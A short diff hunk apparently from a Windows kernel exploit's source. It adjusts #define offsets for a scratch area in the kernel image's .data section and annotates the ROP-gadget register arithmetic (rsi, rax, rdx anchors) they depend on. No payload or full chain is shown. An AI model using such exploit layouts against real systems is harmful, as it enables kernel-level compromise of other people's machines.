@@ -47,8 +47,8 @@ rdx anchor — gadget3 reads new_rax from [rdx+0x1B0]:
 #define KUSD_SCRATCH_OFF        KUSERSHAREDDATA_SIZE        // 0xa80
 
 // All offsets below are relative to scratch base (ntso .data + 0x80000)
-#define SCRATCH_RSI_BCK         0x00
-#define SCRATCH_RSI_FWD         0xA5
+#define SCRATCH_RSI_BCK         0x06    // [rsi-0x39] = scratchBase+0x3F-0x39 = scratchBase+0x06
+#define SCRATCH_RSI_FWD         0xA5    // [rsi+0x66] = scratchBase+0x3F+0x66 = scratchBase+0xA5
 #define SCRATCH_RAX             0xB0
 #define SCRATCH_NEW_RAX         0xC0
 #define SCRATCH_G3_CONT         0x280   // 0xC0 + 0x1C0
